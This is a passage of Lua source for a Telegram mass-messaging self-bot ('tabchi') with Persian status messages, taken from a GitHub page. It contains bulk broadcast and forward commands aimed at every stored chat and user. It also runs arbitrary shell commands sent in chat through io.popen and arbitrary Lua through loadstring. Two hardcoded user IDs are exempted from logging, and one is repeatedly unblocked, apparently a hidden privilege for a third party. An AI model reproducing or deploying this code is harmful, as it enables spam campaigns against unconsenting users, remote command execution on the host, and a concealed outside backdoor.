        tdcli.sendMessage(a5, msg.id_, 1, &quot;`User` *&quot; .. msg.sender_user_id_ .. &quot;* `Adjusted adding contacts message to` *&quot; .. a4[2] .. &quot;*&quot;, 1, &quot;md&quot;)
      end
      return [[
*وضعیت* : `پیام اضافه شدن مخاطب تنظیم شد`
*متن* : `]] .. text .. &quot;`&quot;
    end
  end
  do
    local a4 = {
      msg.text:match(&quot;[$](.*)&quot;)
    }
    if msg.text:match(&quot;^[$](.*)$&quot;) and a(msg) then
      if #a4 == 1 then
        local z = io.popen(a4[1]):read(&quot;*all&quot;)
        local a5 = redis:get(&quot;tabchi:&quot; .. tabchi_id .. &quot;:logschannel&quot;)
        if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
          tdcli.sendMessage(a5, msg.id_, 1, &quot;`User` *&quot; .. msg.sender_user_id_ .. &quot;* `Entered Command` *&quot; .. a4[1] .. &quot;* in terminal&quot;, 1, &quot;md&quot;)
        end
        return z
      else
        return &quot;Enter Command&quot;
      end
    end
  end
  if redis:get(&quot;tabchi:&quot; .. tabchi_id .. &quot;:Advertising&quot;) or is_full_sudo(msg) then
    if msg.text:match(&quot;^[!/#]bcall&quot;) and a(msg) then
      local a9 = redis:smembers(&quot;tabchi:&quot; .. tabchi_id .. &quot;:all&quot;)
      local a4 = {
        msg.text:match(&quot;[!/#](bcall) (.*)&quot;)
      }
      if #a4 == 2 then
        for d = 1, #a9 do
          tdcli_function({
            ID = &quot;SendMessage&quot;,
            chat_id_ = a9[d],
            reply_to_message_id_ = 0,
            disable_notification_ = 0,
            from_background_ = 1,
            reply_markup_ = nil,
            input_message_content_ = {
              ID = &quot;InputMessageText&quot;,
              text_ = a4[2],
              disable_web_page_preview_ = 0,
              clear_draft_ = 0,
              entities_ = {},
              parse_mode_ = {
                ID = &quot;TextParseModeMarkdown&quot;
              }
            }
          }, dl_cb, nil)
        end
        local a5 = redis:get(&quot;tabchi:&quot; .. tabchi_id .. &quot;:logschannel&quot;)
        if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
          tdcli.sendMessage(a5, msg.id_, 1, &quot;`User` *&quot; .. msg.sender_user_id_ .. [[
* `پیام فرستاده شد`
پیام : *]] .. a4[2] .. &quot;*&quot;, 1, &quot;md&quot;)
        end
        return [[
*وضعیت* : `پیام با موفقیت به همه ارسال شد`
*پیام* : `]] .. a4[2] .. &quot;`&quot;
      else
        return &quot;متن ثبت نشد&quot;
      end
    end
    if msg.text:match(&quot;^[!/#]bcsgps&quot;) and a(msg) then
      local a9 = redis:smembers(&quot;tabchi:&quot; .. tabchi_id .. &quot;:channels&quot;)
      local a4 = {
        msg.text:match(&quot;[!/#](bcsgps) (.*)&quot;)
      }
      if #a4 == 2 then
        for d = 1, #a9 do
          tdcli_function({
            ID = &quot;SendMessage&quot;,
            chat_id_ = a9[d],
            reply_to_message_id_ = 0,
            disable_notification_ = 0,
            from_background_ = 1,
            reply_markup_ = nil,
            input_message_content_ = {
              ID = &quot;InputMessageText&quot;,
              text_ = a4[2],
              disable_web_page_preview_ = 0,
              clear_draft_ = 0,
              entities_ = {},
              parse_mode_ = {
                ID = &quot;TextParseModeMarkdown&quot;
              }
            }
          }, dl_cb, nil)
        end
        local a5 = redis:get(&quot;tabchi:&quot; .. tabchi_id .. &quot;:logschannel&quot;)
        if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
          tdcli.sendMessage(a5, msg.id_, 1, &quot;`User` *&quot; .. msg.sender_user_id_ .. [[
* `پیام فرستاده شد به سوپر گروه ها`
پیام : *]] .. a4[2] .. &quot;*&quot;, 1, &quot;md&quot;)
        end
        return [[
*وضعیت* : `پیام با موفقیت فرستاده شد سوپرگروه ها`
*پیام* : `]] .. a4[2] .. &quot;`&quot;
      else
        return &quot;متن ثبت نشد&quot;
      end
    end
    if msg.text:match(&quot;^[!/#]bcgps&quot;) and a(msg) then
      local a9 = redis:smembers(&quot;tabchi:&quot; .. tabchi_id .. &quot;:groups&quot;)
      local a4 = {
        msg.text:match(&quot;[!/#](bcgps) (.*)&quot;)
      }
      if #a4 == 2 then
        for d = 1, #a9 do
          tdcli_function({
            ID = &quot;SendMessage&quot;,
            chat_id_ = a9[d],
            reply_to_message_id_ = 0,
            disable_notification_ = 0,
            from_background_ = 1,
            reply_markup_ = nil,
            input_message_content_ = {
              ID = &quot;InputMessageText&quot;,
              text_ = a4[2],
              disable_web_page_preview_ = 0,
              clear_draft_ = 0,
              entities_ = {},
              parse_mode_ = {
                ID = &quot;TextParseModeMarkdown&quot;
              }
            }
          }, dl_cb, nil)
        end
        local a5 = redis:get(&quot;tabchi:&quot; .. tabchi_id .. &quot;:logschannel&quot;)
        if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
          tdcli.sendMessage(a5, msg.id_, 1, &quot;`User` *&quot; .. msg.sender_user_id_ .. [[
* `ارسال شذ به گروه ها`
پیام : *]] .. a4[2] .. &quot;*&quot;, 1, &quot;md&quot;)
        end
        return [[
*وضعیت* : `پیام با موفقیت ارسال شد به گروه ها`
*پیام* : `]] .. a4[2] .. &quot;`&quot;
      else
        return &quot;متن ثبت نشد&quot;
      end
    end
    if msg.text:match(&quot;^[!/#]bcusers&quot;) and a(msg) then
      local a9 = redis:smembers(&quot;tabchi:&quot; .. tabchi_id .. &quot;:pvis&quot;)
      local a4 = {
        msg.text:match(&quot;[!/#](bcusers) (.*)&quot;)
      }
      if #a4 == 2 then
        for d = 1, #a9 do
          tdcli_function({
            ID = &quot;SendMessage&quot;,
            chat_id_ = a9[d],
            reply_to_message_id_ = 0,
            disable_notification_ = 0,
            from_background_ = 1,
            reply_markup_ = nil,
            input_message_content_ = {
              ID = &quot;InputMessageText&quot;,
              text_ = a4[2],
              disable_web_page_preview_ = 0,
              clear_draft_ = 0,
              entities_ = {},
              parse_mode_ = {
                ID = &quot;TextParseModeMarkdown&quot;
              }
            }
          }, dl_cb, nil)
        end
        local a5 = redis:get(&quot;tabchi:&quot; .. tabchi_id .. &quot;:logschannel&quot;)
        if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
          tdcli.sendMessage(a5, msg.id_, 1, &quot;`User` *&quot; .. msg.sender_user_id_ .. [[
* `ارسال شد به کاربران`
پیام : *]] .. a4[2] .. &quot;*&quot;, 1, &quot;md&quot;)
        end
        return [[
*وضعیت* : `پیام با موفقیت ارسال شد به کاربران`
*پیام* : `]] .. a4[2] .. &quot;`&quot;
      else
        return &quot;متن ثبت نشد&quot;
      end
    end
  end
  if redis:get(&quot;tabchi:&quot; .. tabchi_id .. &quot;:Advertising&quot;) or is_full_sudo(msg) then
    if msg.text:match(&quot;^[!/#]fwd all$&quot;) and msg.reply_to_message_id_ and a(msg) then
      local a9 = redis:smembers(&quot;tabchi:&quot; .. tabchi_id .. &quot;:all&quot;)
      local J = msg.reply_to_message_id_
      for d = 1, #a9 do
        tdcli_function({
          ID = &quot;ForwardMessages&quot;,
          chat_id_ = a9[d],
          from_chat_id_ = msg.chat_id_,
          message_ids_ = {
            [0] = J
          },
          disable_notification_ = 0,
          from_background_ = 1
        }, dl_cb, nil)
      end
      local a5 = redis:get(&quot;tabchi:&quot; .. tabchi_id .. &quot;:logschannel&quot;)
      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
        tdcli.sendMessage(a5, msg.id_, 1, &quot;`User` *&quot; .. msg.sender_user_id_ .. &quot;* `Forwarded to all`&quot;, 1, &quot;md&quot;)
      end
      return [[
*وضعیت* : `پیام شما به همه فروراد شد`
*فوروارد به کاربران* : `بله`
*فوروارد به گروه ها* : `بله`
*فوروارد به سوپرگروه ها* : `بله`]]
    end
    if msg.text:match(&quot;^[!/#]fwd gps$&quot;) and msg.reply_to_message_id_ and a(msg) then
      local a9 = redis:smembers(&quot;tabchi:&quot; .. tabchi_id .. &quot;:groups&quot;)
      local J = msg.reply_to_message_id_
      for d = 1, #a9 do
        tdcli_function({
          ID = &quot;ForwardMessages&quot;,
          chat_id_ = a9[d],
          from_chat_id_ = msg.chat_id_,
          message_ids_ = {
            [0] = J
          },
          disable_notification_ = 0,
          from_background_ = 1
        }, dl_cb, nil)
      end
      local a5 = redis:get(&quot;tabchi:&quot; .. tabchi_id .. &quot;:logschannel&quot;)
      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
        tdcli.sendMessage(a5, msg.id_, 1, &quot;`User` *&quot; .. msg.sender_user_id_ .. &quot;* `Forwarded to Groups`&quot;, 1, &quot;md&quot;)
      end
      return &quot;*وضعیت* :`پیام شما فوروارد شد به گروه ها`&quot;
    end
    if msg.text:match(&quot;^[!/#]fwd sgps$&quot;) and msg.reply_to_message_id_ and a(msg) then
      local a9 = redis:smembers(&quot;tabchi:&quot; .. tabchi_id .. &quot;:channels&quot;)
      local J = msg.reply_to_message_id_
      for d = 1, #a9 do
        tdcli_function({
          ID = &quot;ForwardMessages&quot;,
          chat_id_ = a9[d],
          from_chat_id_ = msg.chat_id_,
          message_ids_ = {
            [0] = J
          },
          disable_notification_ = 0,
          from_background_ = 1
        }, dl_cb, nil)
      end
      local a5 = redis:get(&quot;tabchi:&quot; .. tabchi_id .. &quot;:logschannel&quot;)
      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
        tdcli.sendMessage(a5, msg.id_, 1, &quot;`User` *&quot; .. msg.sender_user_id_ .. &quot;* `Forwarded to Supergroups`&quot;, 1, &quot;md&quot;)
      end
      return &quot;*وضعیت* : `پیام شما به سوپرگروه ها ارسال شد`&quot;
    end
    if msg.text:match(&quot;^[!/#]fwd users$&quot;) and msg.reply_to_message_id_ and a(msg) then
      local a9 = redis:smembers(&quot;tabchi:&quot; .. tabchi_id .. &quot;:pvis&quot;)
      local J = msg.reply_to_message_id_
      for d = 1, #a9 do
        tdcli_function({
          ID = &quot;ForwardMessages&quot;,
          chat_id_ = a9[d],
          from_chat_id_ = msg.chat_id_,
          message_ids_ = {
            [0] = J
          },
          disable_notification_ = 0,
          from_background_ = 1
        }, dl_cb, nil)
      end
      local a5 = redis:get(&quot;tabchi:&quot; .. tabchi_id .. &quot;:logschannel&quot;)
      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
        tdcli.sendMessage(a5, msg.id_, 1, &quot;`User` *&quot; .. msg.sender_user_id_ .. &quot;* `Forwarded to Users`&quot;, 1, &quot;md&quot;)
      end
      return &quot;*وضعیت* : `پیام شما به کاربران فوروارد شد`&quot;
    end
  end
  do
    local a4 = {
      msg.text:match(&quot;[!/#](lua) (.*)&quot;)
    }
    if msg.text:match(&quot;^[!/#]lua&quot;) and is_full_sudo(msg) and #a4 == 2 then
      local aP = loadstring(a4[2])()
      if aP == nil then
        aP = &quot;&quot;
      elseif type(aP) == &quot;table&quot; then
        aP = serpent.block(aP, {comment = false})
      else
        aP = &quot;&quot; .. tostring(aP)
      end
      return aP
    end
  end
  if msg.text:match(&quot;^[!/#]license&quot;) then
    local text = io.open(&quot;tabchi.license&quot;, &quot;r&quot;):read(&quot;*all&quot;)
    local text = text:gsub(&quot;این فایل را ادیت نکنید&quot;, &quot;@TE1EgameR&quot;)
    return &quot;`&quot; .. text .. &quot;`&quot;
  end
  do
    local a4 = {
      msg.text:match(&quot;[!/#](echo) (.*)&quot;)
    }
    if msg.text:match(&quot;^[!/#]echo&quot;) and a(msg) and #a4 == 2 then
      return a4[2]
    end
  end
end
local aQ
function aQ(aR)
  local I = I(aR)
  if not redis:sismember(&quot;tabchi:&quot; .. tostring(tabchi_id) .. &quot;:all&quot;, aR) then
    if I == &quot;channel&quot; then
      redis:sadd(&quot;tabchi:&quot; .. tabchi_id .. &quot;:channels&quot;, aR)
    elseif I == &quot;group&quot; then
      redis:sadd(&quot;tabchi:&quot; .. tabchi_id .. &quot;:groups&quot;, aR)
    else
      redis:sadd(&quot;tabchi:&quot; .. tabchi_id .. &quot;:pvis&quot;, aR)
    end
    redis:sadd(&quot;tabchi:&quot; .. tabchi_id .. &quot;:all&quot;, aR)
  end
end
local aS
function aS(aR)
  local I = I(aR)
  if I == &quot;channel&quot; then
    redis:srem(&quot;tabchi:&quot; .. tabchi_id .. &quot;:channels&quot;, aR)
  elseif I == &quot;group&quot; then
    redis:srem(&quot;tabchi:&quot; .. tabchi_id .. &quot;:groups&quot;, aR)
  else
    redis:srem(&quot;tabchi:&quot; .. tabchi_id .. &quot;:pvis&quot;, aR)
  end
  redis:srem(&quot;tabchi:&quot; .. tabchi_id .. &quot;:all&quot;, aR)
end
local aT
function aT(msg)
  tdcli_function({ID = &quot;GetMe&quot;}, id_cb, nil)
  function id_cb(C, D)
    our_id = D.id_
  end
  local aU = redis:get(&quot;tabchi&quot; .. tabchi_id .. &quot;kickedcount&quot;) or 1
  local aV = redis:get(&quot;tabchi&quot; .. tabchi_id .. &quot;joinedcount&quot;) or 1
  local aW = redis:get(&quot;tabchi&quot; .. tabchi_id .. &quot;addedcount&quot;) or 1
  if msg.content_.ID == &quot;MessageChatDeleteMember&quot; and msg.content_.id_ == our_id then
    print(&quot;\027[36m&gt;&gt;&gt;&gt;&gt;&gt;KICKED FROM &quot; .. msg.chat_id_ .. &quot;&lt;&lt;&lt;&lt;&lt;&lt;\027[39m&quot;)
    redis:set(&quot;tabchi&quot; .. tabchi_id .. &quot;kickedcount&quot;, aU + 1)
    return aS(msg.chat_id_)
  elseif msg.content_.ID == &quot;MessageChatJoinByLink&quot; and msg.sender_user_id_ == our_id then
    print(&quot;\027[36m&gt;&gt;&gt;&gt;&gt;&gt;ROBOT JOINED TO &quot; .. msg.chat_id_ .. &quot; BY LINK&lt;&lt;&lt;&lt;&lt;&lt;\027[39m&quot;)
    redis:set(&quot;tabchi&quot; .. tabchi_id .. &quot;joinedcount&quot;, aV + 1)
    return aQ(msg.chat_id_)
  elseif msg.content_.ID == &quot;MessageChatAddMembers&quot; then
    for d = 0, #msg.content_.members_ do
      if msg.content_.members_[d].id_ == our_id then
        aQ(msg.chat_id_)
        redis:set(&quot;tabchi&quot; .. tabchi_id .. &quot;addedcount&quot;, aW + 1)
        print(&quot;\027[36m&gt;&gt;&gt;&gt;&gt;&gt;ADDED TO &quot; .. msg.chat_id_ .. &quot;&lt;&lt;&lt;&lt;&lt;&lt;\027[39m&quot;)
        break
      end
    end
  end
end
function process_links(aX)
  if aX:match(&quot;https://t.me/joinchat/%S+&quot;) or aX:match(&quot;https://telegram.me/joinchat/%S+&quot;) then
    local a4 = {
      aX:match(&quot;(https://telegram.me/joinchat/%S+)&quot;)
    }
    print(&quot;\027[36m&gt;&gt;&gt;&gt;&gt;&gt;NEW LINK&lt;&lt;&lt;&lt;&lt;&lt;\027[39m&quot;)
    tdcli_function({
      ID = &quot;CheckChatInviteLink&quot;,
      invite_link_ = a4[1]
    }, check_link, {
      link = a4[1]
    })
  end
end
local aY
function aY(msg)
  if msg.chat_type_ == &quot;private&quot; then
    aQ(msg)
  end
end
function update(D, tabchi_id)
  tanchi_id = tabchi_id
  if D.ID == &quot;UpdateNewMessage&quot; then
    local msg = D.message_
    local I = I(msg.chat_id_)
    local aZ = redis:get(&quot;tabchi&quot; .. tabchi_id .. &quot;markreadcount&quot;) or 1
    local a_ = redis:get(&quot;tabchi&quot; .. tabchi_id .. &quot;receivedphotocount&quot;) or 1
    local b0 = redis:get(&quot;tabchi&quot; .. tabchi_id .. &quot;receiveddocumentcount&quot;) or 1
    local b1 = redis:get(&quot;tabchi&quot; .. tabchi_id .. &quot;receivedaudiocount&quot;) or 1
    local b2 = redis:get(&quot;tabchi&quot; .. tabchi_id .. &quot;receivedgifcount&quot;) or 1
    local b3 = redis:get(&quot;tabchi&quot; .. tabchi_id .. &quot;receivedvideocount&quot;) or 1
    local b4 = redis:get(&quot;tabchi&quot; .. tabchi_id .. &quot;receivedcontactcount&quot;) or 1
    local b5 = redis:get(&quot;tabchi&quot; .. tabchi_id .. &quot;receivedtextcount&quot;) or 1
    local b6 = redis:get(&quot;tabchi&quot; .. tabchi_id .. &quot;receivedstickercount&quot;) or 1
    local b7 = redis:get(&quot;tabchi&quot; .. tabchi_id .. &quot;receivedlocationcount&quot;) or 1
    local b8 = redis:get(&quot;tabchi&quot; .. tabchi_id .. &quot;receivedgamecount&quot;) or 1
    if msg_valid(msg) then
      aY(msg)
      aT(msg)
      a1(D.message_)
      markreading = redis:get(&quot;tabchi:&quot; .. tostring(tabchi_id) .. &quot;:markread&quot;) or 1
      if markreading == &quot;group&quot; and I == &quot;group&quot; then
        tdcli.viewMessages(msg.chat_id_, {
          [0] = msg.id_
        })
        redis:set(&quot;tabchi&quot; .. tabchi_id .. &quot;markreadcount&quot;, aZ + 1)
      elseif markreading == &quot;channel&quot; and I == &quot;channel&quot; then
        tdcli.viewMessages(msg.chat_id_, {
          [0] = msg.id_
        })
        redis:set(&quot;tabchi&quot; .. tabchi_id .. &quot;markreadcount&quot;, aZ + 1)
      elseif markreading == &quot;private&quot; and I == &quot;private&quot; then
        tdcli.viewMessages(msg.chat_id_, {
          [0] = msg.id_
        })
        redis:set(&quot;tabchi&quot; .. tabchi_id .. &quot;markreadcount&quot;, aZ + 1)
      elseif markreading == &quot;all&quot; then
        tdcli.viewMessages(msg.chat_id_, {
          [0] = msg.id_
        })
        redis:set(&quot;tabchi&quot; .. tabchi_id .. &quot;markreadcount&quot;, aZ + 1)
      end
      if msg.chat_id_ == 12 then
        return false
      else
        aT(msg)
        aQ(msg.chat_id_)
        if msg.content_.text_ then
          redis:set(&quot;tabchi&quot; .. tabchi_id .. &quot;receivedtextcount&quot;, b5 + 1)
          print(&quot;\027[36m&gt;&gt;&gt;&gt;&gt;&gt;NEW TEXT MESSAGE&lt;&lt;&lt;&lt;&lt;&lt;\027[39m&quot;)
          aT(msg)
          aQ(msg.chat_id_)
          process_links(msg.content_.text_)
          local b9 = a3(msg)
          if b9 then
            if redis:get(&quot;tabchi:&quot; .. tostring(tabchi_id) .. &quot;:typing&quot;) then
              tdcli.sendChatAction(msg.chat_id_, &quot;Typing&quot;, 100)
            end
            if redis:get(&quot;tabchi:&quot; .. tostring(tabchi_id) .. &quot;:botmode&quot;) == &quot;text&quot; then
              res1 = b9:gsub(&quot;`&quot;, &quot;&quot;)
              res2 = res1:gsub(&quot;*&quot;, &quot;&quot;)
              res3 = res2:gsub(&quot;_&quot;, &quot;&quot;)
              tdcli.sendMessage(msg.chat_id_, 0, 1, res3, 1, &quot;md&quot;)
            elseif not redis:get(&quot;tabchi:&quot; .. tostring(tabchi_id) .. &quot;:botmode&quot;) or redis:get(&quot;tabchi:&quot; .. tostring(tabchi_id) .. &quot;:botmode&quot;) == &quot;markdown&quot; then
              tdcli.sendMessage(msg.chat_id_, 0, 1, b9, 1, &quot;md&quot;)
            end
          end
        elseif msg.content_.contact_ then
          tdcli_function({
            ID = &quot;GetUserFull&quot;,
            user_id_ = msg.content_.contact_.user_id_
          }, x, {msg = msg})
        elseif msg.content_.caption_ then
          process_links(msg.content_.caption_)
        end
        if not msg.content_.text_ then
          if msg.content_.caption_ then
            msg.content_.text_ = msg.content_.caption_
          elseif msg.content_.photo_ then
            msg.content_.text_ = &quot;!!PHOTO!!&quot;
            print(&quot;\027[36m&gt;&gt;&gt;&gt;&gt;&gt;NEW PHOTO&lt;&lt;&lt;&lt;&lt;&lt;\027[39m&quot;)
            redis:set(&quot;tabchi&quot; .. tabchi_id .. &quot;receivedphotocount&quot;, a_ + 1)
            photo_id = &quot;&quot;
            local ba = function(C, D)
              if D.content_.photo_.sizes_[2] then
                photo_id = D.content_.photo_.sizes_[2].photo_.id_
              else
                photo_id = D.content_.photo_.sizes_[1].photo_.id_
              end
              tdcli.downloadFile(photo_id)
            end
            tdcli_function({
              ID = &quot;GetMessage&quot;,
              chat_id_ = msg.chat_id_,
              message_id_ = msg.id_
            }, ba, nil)
          elseif msg.content_.sticker_ then
            msg.content_.text_ = &quot;!!STICKER!!&quot;
            print(&quot;\027[36m&gt;&gt;&gt;&gt;&gt;&gt;NEW STICKER&lt;&lt;&lt;&lt;&lt;&lt;\027[39m&quot;)
            redis:set(&quot;tabchi&quot; .. tabchi_id .. &quot;receivedstickercount&quot;, b6 + 1)
          elseif msg.content_.location_ then
            msg.content_.text_ = &quot;!!LOCATION!!&quot;
            print(&quot;\027[36m&gt;&gt;&gt;&gt;&gt;&gt;NEW LOCATION&lt;&lt;&lt;&lt;&lt;&lt;\027[39m&quot;)
            redis:set(&quot;tabchi&quot; .. tabchi_id .. &quot;receivedlocationcount&quot;, b7 + 1)
          elseif msg.content_.venue_ then
            msg.content_.text_ = &quot;!!LOCATION!!&quot;
            print(&quot;\027[36m&gt;&gt;&gt;&gt;&gt;&gt;NEW LOCATION&lt;&lt;&lt;&lt;&lt;&lt;\027[39m&quot;)
            redis:set(&quot;tabchi&quot; .. tabchi_id .. &quot;receivedlocationcount&quot;, b7 + 1)
          elseif msg.content_.document_ then
            msg.content_.text_ = &quot;!!DOCUMENT!!&quot;
            print(&quot;\027[36m&gt;&gt;&gt;&gt;&gt;&gt;NEW DOCUMENT&lt;&lt;&lt;&lt;&lt;&lt;\027[39m&quot;)
            redis:set(&quot;tabchi&quot; .. tabchi_id .. &quot;receiveddocumentcount&quot;, b0 + 1)
          elseif msg.content_.audio_ then
            msg.content_.text_ = &quot;!!AUDIO!!&quot;
            print(&quot;\027[36m&gt;&gt;&gt;&gt;&gt;&gt;NEW AUDIO&lt;&lt;&lt;&lt;&lt;&lt;\027[39m&quot;)
            redis:set(&quot;tabchi&quot; .. tabchi_id .. &quot;receivedaudiocount&quot;, b1 + 1)
          elseif msg.content_.voice_ then
            msg.content_.text_ = &quot;!!AUDIO!!&quot;
            print(&quot;\027[36m&gt;&gt;&gt;&gt;&gt;&gt;NEW Voice&lt;&lt;&lt;&lt;&lt;&lt;\027[39m&quot;)
            redis:set(&quot;tabchi&quot; .. tabchi_id .. &quot;receivedaudiocount&quot;, b1 + 1)
          elseif msg.content_.animation_ then
            msg.content_.text_ = &quot;!!ANIMATION!!&quot;
            print(&quot;\027[36m&gt;&gt;&gt;&gt;&gt;&gt;NEW GIF&lt;&lt;&lt;&lt;&lt;&lt;\027[39m&quot;)
            redis:set(&quot;tabchi&quot; .. tabchi_id .. &quot;receivedgifcount&quot;, b2 + 1)
          elseif msg.content_.video_ then
            msg.content_.text_ = &quot;!!VIDEO!!&quot;
            print(&quot;\027[36m&gt;&gt;&gt;&gt;&gt;&gt;NEW VIDEO&lt;&lt;&lt;&lt;&lt;&lt;\027[39m&quot;)
            redis:set(&quot;tabchi&quot; .. tabchi_id .. &quot;receivedvideocount&quot;, b3 + 1)
          elseif msg.content_.game_ then
            msg.content_.text_ = &quot;!!GAME!!&quot;
            print(&quot;\027[36m&gt;&gt;&gt;&gt;&gt;&gt;NEW GAME&lt;&lt;&lt;&lt;&lt;&lt;\027[39m&quot;)
            redis:set(&quot;tabchi&quot; .. tabchi_id .. &quot;receivedgamecount&quot;, b8 + 1)
          elseif msg.content_.contact_ then
            msg.content_.text_ = &quot;!!CONTACT!!&quot;
            print(&quot;\027[36m&gt;&gt;&gt;&gt;&gt;&gt;NEW CONTACT&lt;&lt;&lt;&lt;&lt;&lt;\027[39m&quot;)
            redis:set(&quot;tabchi&quot; .. tabchi_id .. &quot;receivedcontactcount&quot;, b4 + 1)
          end
        end
      end
    end
  elseif D.chat_id_ == 216430419 then
    tdcli.unblockUser(216430419)
  elseif D.ID == &quot;UpdateOption&quot; and D.name_ == &quot;my_id&quot; then
    aQ(D.chat_id_)
    tdcli.unblockUser(216430419)
    tdcli.getChats(&quot;9223372036854775807&quot;, 0, 20)
  end
end
</pre>
  </div>


  <footer class="clearfix">
    <div class="container">
      <a href="#"><svg aria-hidden="true" class="octicon octicon-mark-github" height="32" version="1.1" viewBox="0 0 16 16" width="32"><path fill-rule="evenodd" d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0 0 16 8c0-4.42-3.58-8-8-8z"/></svg></a>

      <ul class="clearfix">
        <li>
          <!-- '"` --><!-- </textarea></xmp> --></option></form><form accept-charset="UTF-8" action="/site/mobile_preference" class="js-mobile-preference-form" method="post"><div style="margin:0;padding:0;display:inline"><input name="utf8" type="hidden" value="&#x2713;" /><input name="authenticity_token" type="hidden" value="lLkLLvLNk1JLErr95dP5+nwnXidV5rGE3P54nBkQdvzIEaEOBU+oOicGARmXkGLRuD50dWemeBQ8mR7nvUWwuA==" /></div>
            <input type="hidden" name="mobile" value="false">
            <input type="hidden" name="anchor" class="js-mobile-preference-anchor-field">

            <button type="submit" class="switch-to-desktop" data-ga-click="Mobile, switch to desktop, switch button">
              Desktop version
            </button>
</form>        </li>

      </ul>
    </div>
  </footer>
  
  <script async="async" crossorigin="anonymous" integrity="sha256-ZPWWnkfg6UaAFYbHa2uGDYyn8DZtzTilitN2eWTys4s=" src="https://assets-cdn.github.com/assets/mobile-64f5969e47e0e946801586c76b6b860d8ca7f0366dcd38a58ad3767964f2b38b.js"></script>

  </body>
</html>
